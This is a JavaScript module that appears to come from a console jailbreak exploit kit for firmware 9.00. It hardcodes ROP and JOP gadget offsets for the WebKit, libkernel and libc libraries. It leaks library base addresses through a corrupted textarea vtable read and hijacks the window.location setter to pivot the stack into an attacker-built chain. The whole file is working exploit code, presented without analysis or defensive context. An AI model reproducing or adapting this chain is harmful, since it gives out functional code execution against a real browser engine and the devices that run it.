import { mem } from '/module/mem.mjs';
import { KB } from '/module/offset.mjs';
import { ChainBase, get_gadget } from '/module/chain.mjs';
import { BufferView } from '/module/rw.mjs';

import {
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '/module/memtools.mjs';

import * as off from '/module/offset.mjs';

// Updated WebKit offsets for 9.00
const offset_wk_stack_chk_fail = 0x8f0;
const offset_wk_strlen = 0x930;

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// Updated gadgets for 9.00
const jop1 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop2 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop3 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop4 = `
push rdx
mov edi, 0xac9784fe
jmp qword ptr [rax]
`;
const jop5 = 'pop rsp; ret';

// Updated gadget offsets for 9.00
const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000035b2b,
    'pop rbx; ret' : 0x000000000001547c,
    'pop rcx; ret' : 0x0000000000025fdb,
    'pop rdx; ret' : 0x0000000000061052,

    'pop rbp; ret' : 0x00000000000000c6,
    'pop rsi; ret' : 0x000000000003be87,
    'pop rdi; ret' : 0x00000000001e4097,
    'pop rsp; ret' : 0x00000000000bf769,

    'pop r8; ret' : 0x0000000000097542,
    'pop r9; ret' : 0x00000000006f511f,
    'pop r10; ret' : 0x0000000000061051,
    'pop r11; ret' : 0x0000000000d2a729,

    'pop r12; ret' : 0x0000000000d8978d,
    'pop r13; ret' : 0x00000000016cd0f1,
    'pop r14; ret' : 0x000000000003be86,
    'pop r15; ret' : 0x0000000000249aef,

    'ret' : 0x0000000000000032,
    'leave; ret' : 0x00000000002920e7,

    'mov rax, qword ptr [rax]; ret' : 0x000000000002dd72,
    'mov qword ptr [rdi], rax; ret' : 0x000000000005b2cb,
    'mov dword ptr [rdi], eax; ret' : 0x000000000001f974,
    'mov dword ptr [rax], esi; ret' : 0x00000000002916cc,

    [jop1] : 0x0000000001988420,
    [jop2] : 0x000000000076ba80,
    [jop3] : 0x0000000000f630a5,
    [jop4] : 0x00000000021af7bd,
    [jop5] : 0x00000000000bf769,
}));

// Updated libc offsets for 9.00
const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : 0x25904,
    'setcontext' : 0x29d68,
}));

// Updated libkernel offsets for 9.00
const libkernel_gadget_offsets = new Map(Object.entries({
    '__error' : 0x161d0,
}));

export const gadgets = new Map();

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const off_ta_vt = 0x236e4a0; // Updated vtable offset for 9.00
    const libwebkit_base = textarea_vtable.sub(off_ta_vt);

    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
    const off_scf = 0x12b40; // Updated offset for 9.00
    const libkernel_base = stack_chk_fail_addr.sub(off_scf);

    const strlen_import = libwebkit_base.add(offset_wk_strlen);
    const strlen_addr = resolve_import(strlen_import);
    const off_strlen = 0x4ec80; // Updated offset for 9.00
    const libc_base = strlen_addr.sub(off_strlen);

    return [
        libwebkit_base,
        libkernel_base,
        libc_base,
    ];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

class Chain900Base extends ChainBase {
    push_end() {
        this.push_gadget('leave; ret');
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);

        this.push_call(this.get_gadget('__error'));

        this.push_gadget('mov rax, qword ptr [rax]; ret');
        this.push_gadget('mov dword ptr [rdi], eax; ret');
    }

    push_clear_errno() {
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('pop rsi; ret');
        this.push_value(0);
        this.push_gadget('mov dword ptr [rax], esi; ret');
    }
}

export class Chain900 extends Chain900Base {
    constructor() {
        super();
        const [rdx, rdx_bak] = mem.gc_alloc(0x58);
        rdx.write64(off.js_cell, this._empty_cell);
        rdx.write64(0x50, this.stack_addr);
        this._rsp = mem.fakeobj(rdx);
    }

    run() {
        this.check_allow_run();
        this._rop.launch = this._rsp;
        this.dirty();
    }
}

export const Chain = Chain900;

export function init(Chain) {
    const syscall_array = [];
    [libwebkit_base, libkernel_base, libc_base] = get_bases();

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    init_syscall_array(syscall_array, libkernel_base, 300 * KB);

    let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
    gs = mem.addrof(gs).readp(0x28);

    const size_cgs = 0x18;
    const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
    mem.cpy(gc_buf, gs, size_cgs);
    gc_buf.write64(0x10, get_gadget(gadgets, jop1));

    const proto = Chain.prototype;
    const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
    mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
    proto._rop = _rop;

    const rax_ptrs = new BufferView(0x100);
    const rax_ptrs_p = get_view_vector(rax_ptrs);
    proto._rax_ptrs = rax_ptrs;

    rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
    rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
    rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
    rax_ptrs.write64(0, get_gadget(gadgets, jop5));

    const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
    jop_buffer_p.write64(0, rax_ptrs_p);

    const empty = {};
    proto._empty_cell = mem.addrof(empty).read64(off.js_cell);

    Chain.init_class(gadgets, syscall_array);
                         }
